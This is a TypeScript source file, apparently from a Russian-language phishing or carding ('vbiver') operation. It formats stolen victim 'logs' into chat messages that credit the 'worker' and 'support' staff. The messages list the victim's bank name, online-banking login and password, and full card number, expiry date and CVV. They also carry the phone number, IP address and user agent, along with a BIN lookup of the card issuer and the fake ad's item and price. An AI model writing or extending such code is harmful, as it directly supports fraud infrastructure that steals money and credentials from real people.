import {Logs} from "@/database/models/logs";
import {getUsername} from "@/helpers/getUsername";
import {getIBANinfo, IBANinfo} from "@/utils/IBANinfo";
import {getFlagEmoji} from "@/helpers/getFlagEmoji";

const regex = /(<)/g;
const subst = `&lt`;

export const createVbiverText = async (log: Logs): Promise<string> => {
    // let text = `#ID_${log.ad.date}\n\n`
    let text = `#ID_${log.ad.date}\n${getFlagEmoji(log.ad.country)} ${log.ad.service.toUpperCase()}${(log.underService) ? ' | ' + log.underService.toUpperCase() : '' }\n\n`

    text += `👷🏿‍♂️ Воркер: ${await getUsername(log.ad.author, true, true)}`
    text += `${(log.ad.support) ? `\n💻 ТП: ${await getUsername(log.ad.support,true, true)}` : ''}`
    text += `\n🆔 ID лога: <code>${log.ad.date}</code>`

    if (log.data.length === 0) return 'undefined data'

    const data = log.data[log.data.length - 1]

    if (data.bankName && data.bankLogin && data.bankPassword) {
        text += `\n\n🏦 <b>Банк:</b> <code>${data?.bankName.replace(regex, subst)}</code>\n`
        if (data.bankLogin !== 'none') text += `\n🌚 <b>Логин:</b> <code>${data.bankLogin.replace(regex, subst)}</code>`
        if (data.bankPassword !== 'none') text += `\n🌚 <b>Пароль:</b> <code>${data.bankPassword.replace(regex, subst)}</code>`
    }

    if (data.bankOtherData){
        try {
            const other = JSON.parse(data.bankOtherData)
            for (const [key, value] of Object.entries(other)) {
                // @ts-ignore
                text += `\n🌚️ <b>${key}:</b> <code>${value.replace(regex, subst)}</code>`
            }
        } catch (e) {}

    }

    if (data.cardNumber && data.cardCVV && data.cardDate) {
        let cardInfo = await getIBANinfo(Number(data.cardNumber.slice(0,6)))
        text += `\n\n💳 <b>Карта:</b> <code>${data.cardNumber}</code>`
        text += `\n📅  <b>Дата:</b> <code>${data.cardDate}</code>`
        text += `\n🚥  <b>CVV:</b> <code>${data.cardCVV}</code>`

        text += `\n🏦 <b>Банк:</b> <code>${cardInfo?.["card-brand"]} ${cardInfo?.issuer}</code>`
    }

    if (data?.phone) {
        text += `\n\n📱 Тел: <code>${data?.phone}</code>`
    }

    text += `\n\n👜 <b>Товар:</b> ${log.ad.title} ${log.ad?.price}`

    text += `\n🌎 IP: ${data?.ip} ${getFlagEmoji(log.country)}`
    text += `\n☁️ USER-AGENT: ${data?.userAgent}`

    return text;
}
